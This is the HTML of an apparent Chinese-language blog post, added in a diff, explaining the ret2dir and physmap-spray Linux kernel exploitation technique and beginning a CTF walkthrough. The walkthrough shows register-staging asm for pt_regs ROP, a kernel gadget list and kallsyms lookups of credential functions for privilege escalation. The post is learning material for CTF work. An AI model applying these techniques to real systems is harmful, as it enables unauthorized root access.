@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/11/23/ret2dir/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="ret2dir &amp; physmap spray介绍​	ret2dir 用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段。 ​	论文链接：http:&#x2F;&#x2F;www.cs.columbia.edu&#x2F;~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf  ​	x86 下的 linux kernel 的内存布局，存在着一块区域叫做     direct mapping a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dir &amp; physmap spray">
+<meta property="og:url" content="http://example.com/2023/11/23/ret2dir/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="ret2dir &amp; physmap spray介绍​	ret2dir 用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段。 ​	论文链接：http:&#x2F;&#x2F;www.cs.columbia.edu&#x2F;~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf  ​	x86 下的 linux kernel 的内存布局，存在着一块区域叫做     direct mapping a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-21_18-09-56.png">
+<meta property="og:image" content="http://example.com/images/CP4h5UA2svuwKbJ.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-01-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-24-32.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_16-08-00.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_19-40-02.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_19-39-26.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_19-44-11.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_19-44-35.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-26-17.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-26-41.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-27-25.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-18-50.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-28-33.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-34-11.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-24-32.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-30-12.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_15-35-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-48-33.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-50-44.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2023-11-22_20-58-07.png">
+<meta property="article:published_time" content="2023-11-23T06:42:05.000Z">
+<meta property="article:modified_time" content="2023-11-24T06:49:05.589Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2023-11-21_18-09-56.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ret2dir &amp; physmap spray -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-n696xn.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">ret2dir &amp; physmap spray</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-11-23 14:42:05</span>
+        <span class="mobile">2023-11-23 14:42:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-11-24 14:49:05</span>
+            <span class="mobile">2023-11-24 14:49:05</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/kernel/">kernel</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/kernel/">kernel</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="ret2dir-physmap-spray"><a href="#ret2dir-physmap-spray" class="headerlink" title="ret2dir &amp; physmap spray"></a>ret2dir &amp; physmap spray</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>​	ret2dir 用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>。</p>
+<p>​	论文链接：<a class="link"   target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>​	x86 下的 linux kernel 的内存布局，存在着一块区域叫做     <code>direct mapping area</code>，即内核的 <code>线性映射区</code>，<strong>线性地直接映射了整个物理内存空间</strong>。</p>
+<p>​	这意味着对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框。</p>
+<p>​	当开启了 SMEP、SMAP、PXN 等防护时，内核空间到用户空间的直接访问被禁止，<strong>无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-21_18-09-56.png"
+                      alt="nipaste_2023-11-21_18-09-5"
+                ></p>
+<p>​	从上图中可以发现，如果我们在用户空间提前布置好 gadget，那么就可以通过 direct mapping area 在内核空间访问到。</p>
+<p>​	但这里需要注意到一个问题就是<strong>新版内核已经不支持直接在线性映射区不在拥有可执行权限</strong>，因此我们可以考虑通过<strong>在用户空间来布置 ROP</strong> 的方继续来进行利用，内容可以见下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/CP4h5UA2svuwKbJ.png"
+                      alt="P4h5UA2svuwKb"
+                ></p>
+<p>​	对于 ret2dir 通常的攻击手法是：</p>
+<ul>
+<li>利用 mmap 在用户空间大量喷射内存</li>
+<li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），这个地址直接来自于线性映射区</li>
+<li>利用泄露出的内核线性映射区的地址进行内存搜索，从而找到在用户空间喷射的内存</li>
+</ul>
+<p>​	<strong>此时就获得了一个映射到用户空间的内核空间地址</strong>，通过这个<strong>内核空间地址便能直接访问到用户空间的数据</strong>，从而<strong>避开了传统的隔绝用户空间与内核空间的防护手段</strong></p>
+<p>​	需要注意的是往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code>。</p>
+<p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt" >https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_20-01-03.png"
+                      alt="nipaste_2023-11-22_20-01-0"
+                ></p>
+<p>​	如上图所示，我们用mmap申请到的内存，可以在线性映射区看到，</p>
+<p>​	可这里有一个问题，从上图可以看到，线性映射区这里有 64TB 空间，到底去哪里找到 mmap 出来的那一页数据呢，其实这里就会使用到<a class="link"   target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >原论文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中的一种名为 <code>physmap spray</code> 的攻击手法——<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个 direct mapping area 上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>。</p>
+<p>​	在喷射的内存页数量达到一定数量级时能够<strong>比较准确的在 direct mapping area 靠中后部的区域命中恶意数据。</strong></p>
+<h2 id="利用-pt-regs"><a href="#利用-pt-regs" class="headerlink" title="利用 pt_regs"></a>利用 pt_regs</h2><pre><code>  首先来看看       `syscall` 这一汇编指令，通常情况下我们在调用 syscall 前会向寄存器中提前设置好参数，然后调用 syscall 时就会通过门结构进入到内核中的 `entry_SYSCALL_64` 这一函数，随后通过系统调用表跳转到对应的函数。
+</code></pre>
+<p><strong>entry_SYSCALL_64</strong></p>
+<p>​	而这一函数的作用又是什么呢，当我们的程序进入内核态时，这个函数会将此时我们用户态下所有寄存器压入到内核栈上，形成一个 pt_regs 结构体。这里不用具体管 pt_regs 结构体是什么。</p>
+<p>​	<strong>简单来理解就是在进入到内核态时，会将所有寄存器进行压栈，</strong>这就是利用 pt_regs 的核心，从而使得我们可以在栈中一些位置上通过提前构造寄存器中的值来设置栈中的数据。</p>
+<pre><code> 如下图代码所示，我们在进入内核态时，提前设置了如下寄存器
+</code></pre>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">	&quot;mov r15, 0x1111111111;&quot;</span><br><span class="line">	&quot;mov r14, 0x2222222222;&quot;</span><br><span class="line">	&quot;mov r13, 0x3333333333;&quot;</span><br><span class="line">	&quot;mov r12, 0x4444444444;&quot;</span><br><span class="line">	&quot;mov rbp, 0x5555555555;&quot;</span><br><span class="line">	&quot;mov rbx, 0x6666666666;&quot;</span><br><span class="line">	&quot;mov r11, 0x7777777777;&quot;</span><br><span class="line">	&quot;mov r10, 0x8888888888;&quot;</span><br><span class="line">	&quot;mov r9,  0x9999999999;&quot;</span><br><span class="line">	&quot;mov r8,  0xaaaaaaaaaa;&quot;</span><br><span class="line">	&quot;mov rcx, 0x666666;&quot;</span><br><span class="line">	&quot;mov rdx, 8;&quot;</span><br><span class="line">	&quot;mov rsi, rsp;&quot;</span><br><span class="line">	&quot;mov rdi, fd_seq;&quot;</span><br><span class="line">	&quot;xor rax, rax;&quot;</span><br><span class="line">	&quot;syscall&quot;</span><br><span class="line">	);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_15-24-32.png"
+                      alt="nipaste_2023-11-22_15-24-3"
+                ></p>
+<p>​	上图即为进入内核态后，栈中的数据情况，<strong>可以发现我们上面代码中设置的值被复制到了栈中，因此我们就可以通过控制寄存器设置栈中的值来完成一些 ROP 操作，这就是利用 pr_regs 的核心思想。</strong>	</p>
+<p>​	不过新版本貌似在 <a class="link"   target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14" > commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中为系统调用栈<strong>添加了一个偏移值，这意味着 pt_regs 与触发劫持内核执行流时的栈间偏移值不再是固定值</strong>，不过在随机偏移值较小时，仍可以尝试进行利用（暂未尝试）。</p>
+<h2 id="例题MINI-LCTF2022-kgadget"><a href="#例题MINI-LCTF2022-kgadget" class="headerlink" title="例题MINI-LCTF2022 - kgadget"></a>例题MINI-LCTF2022 - kgadget</h2><p>​	这里想吐槽一下，在学习 kernel pwn 的过程中，网上看到的大多数博客，对于同一个问题或者技巧，大家都基本上千篇一律，而且都有一个在我看来致命的缺点（可能大佬都图省事吧），大家在做一个题目时，甚至不会给出具体的调试过程，只会进行文字性说明，或者给出一些静态分析的东西，这对我这样的新手感觉非常不友好，自从开始学习pwn，我始终秉持一个观念 ”无调无pwn“ ，调试的过程很重要，而且我认为调试才是核心，像这道题可能理论很快就学会了，但调试起来就非常花费时间（从下午调试到晚上通了），所以我自己会尽量在做每一道 kernel pwn 的过程中，展现出我认为比较重要的动调过程，希望能够对入门 kernel pwn 的师傅有用。</p>
+<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff810737fe: add rsp, 0xa0; pop rbx; pop r12; pop r13; pop rbp; ret; </span><br><span class="line">0xffffffff8108c6f0: pop_rdi; ret;</span><br><span class="line">0xffffffff8105b9f8: pop_rbp; ret;</span><br><span class="line">0xffffffff811483d0: pop_rsp; ret;</span><br><span class="line">0xffffffff8108c6f1: ret;</span><br><span class="line">0xffffffff81c0129c: swapgs; nop; nop; nop; ret;</span><br><span class="line">0xffffffff8103ba65: iretq; pop rbp; ret;</span><br><span class="line">0xffffffff81c00fb0 + 27: swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure></div>
+
+<p>​	<strong>注意事项：</strong>我们一般在着陆用户态时，最后一个 gadget一定是 iretq; ret; 形如  iretq; pop rbp; ret; 这样的gadget 是不可以的。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/kallsyms | grep &quot;init_cred&quot;</span></span><br><span class="line">ffffffff81aca130 t maybe_init_creds</span><br><span class="line">ffffffff82a6b700 D init_cred</span><br><span class="line">/ <span class="comment"># cat /proc/kallsyms | grep &quot;commit_creds&quot;</span></span><br><span class="line">ffffffff810c92e0 T commit_creds</span><br><span class="line">ffffffff824dc650 r __ksymtab_commit_creds</span><br><span class="line">ffffffff82509988 r __kstrtab_commit_creds</span><br><span class="line">ffffffff8250e4a8 r __kstrtabns_commit_creds</span><br><span class="line">/ <span class="comment"># cat /proc/kallsyms | grep &quot;prepare_kernel_cred&quot;</span></span><br><span class="line">ffffffff810c9540 T prepare_kernel_cred</span><br><span class="line">ffffffff824e46c0 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff825099c8 r __kstrtab_prepare_kernel_cred</span><br><span class="line">ffffffff8250e4a8 r __kstrtabns_prepare_kernel_cred</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2023-11-22_16-08-00.png"
+                      alt="nipaste_2023-11-22_16-08-0"
+                ></p>
+<p>​	可以通过 &#x2F;proc&#x2F;kallsyms 来获取内核中一些符号地址信息。</p>
+<p><strong>注意事项</strong></p>
+<p>​	在这道题目中找不到 mov rdi, rax; 这样的 gadget，无法直接用 commit_creds(prepare_kernel_cred(NULL)) 来提权，这个函数调用能提权的原理，是最终调用了 commit_creds(init_cred)，其中 init_cred 在 .data 段，表示 root 权限的 creds 结构体</p>
+<h3 id="热身环节"><a href="#热身环节" class="headerlink" title="热身环节"></a>热身环节</h3><p>​	<strong>解压命令</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir kerpwn </span><br><span class="line">cd kerpwn </span><br><span class="line">mv ../rootfs.cpio rootfs.cpio</span><br><span class="line">cpio -idm &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure></div>
+
+<p>​	<strong>打包脚本 packfile.sh</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">gcc ./exploit.c -o exploit -g -static -masm=intel</span><br><span class="line"><span class="built_in">mv</span> exploit ./kerpwn</span><br><span class="line"><span class="built_in">cd</span> ./kerpwn</span><br><span class="line">./gen_cpio.sh rootfs.cpio</span><br><span class="line"><span class="built_in">mv</span> rootfs.cpio ../</span><br><span class="line"><span class="built_in">cd</span> ../</span><br></pre></td></tr></table></figure></div>
+
+<p>​	<strong>gen_cpio.sh</strong></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; <span class="variable">$1</span></span><br></pre></td></tr></table></figure></div>
+
+<p>​	<strong>调试</strong></p>
